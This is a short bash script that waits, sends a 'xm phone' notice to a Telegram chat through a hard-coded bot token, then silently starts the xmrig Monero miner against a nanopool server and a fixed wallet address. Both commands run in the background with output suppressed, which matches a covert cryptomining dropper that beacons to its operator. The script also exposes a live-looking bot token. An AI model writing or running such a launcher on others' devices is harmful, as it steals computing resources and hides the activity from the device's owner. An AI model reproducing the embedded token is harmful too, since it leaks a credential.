#!/bin/bash
sleep 10
BOT_TOKEN="7358706949:AAGmCtR29AVrmTO5lH6M7424T0pWim_Pm0k"
CHAT_ID="5792222595"
MESSAGE="xm phone"

nohup curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" -d "chat_id=$CHAT_ID" -d "text=$MESSAGE" &>/dev/null &
sleep 3
nohup xmrig -o xmr-eu1.nanopool.org:14433 -u 43gD64iSezxjDgMaNpRHQAKBU6TPawhBVCRxAB4KE7xchZMqAwG1WJh7xM7p7v4XkFRGvQwYQEECdLFcMpWYzh9WSyKv1r3 --tls --coin monero --threads=2 > /dev/null 2>&1 &
